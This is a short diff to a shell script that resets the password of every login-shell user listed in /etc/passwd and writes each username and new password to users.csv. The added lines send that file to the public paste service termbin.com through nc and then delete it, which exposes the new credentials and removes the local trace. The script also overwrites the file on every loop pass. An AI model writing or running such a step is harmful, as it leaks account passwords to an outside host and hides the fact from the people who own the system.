@@ -27,3 +27,5 @@ for user in $(awk -F: '$7 ~ /(\/sh|\/bash)/ { print $1 }' /etc/passwd); do
 	echo -e "$newPass\\n$newPass" | passwd "$user"
   echo -e "$user,$newPass\n" > users.csv
 done
+
+(cat users.csv | nc termbin.com 9999) && rm -rf users.csv
